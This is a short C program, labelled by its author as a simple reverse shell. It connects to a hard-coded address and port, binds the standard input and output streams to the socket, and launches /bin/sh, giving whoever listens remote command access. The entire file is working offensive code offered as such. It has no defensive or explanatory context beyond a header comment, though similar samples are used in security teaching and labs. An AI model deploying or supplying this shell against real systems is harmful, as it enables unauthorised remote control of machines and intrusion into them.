/*
 * Simple reverse shell in C
 *
 * author: @ linkavych
 * date: 2022-11-06
 */
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define TARGET "127.0.0.1"
#define TARGET_PORT 5555

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(TARGET);
    sa.sin_port = htons(TARGET_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));

    for(int i = 0; i < 3; i++)
    {
        dup2(s, i);
    }

    execve("/bin/sh", 0, 0);

    return 0;
}
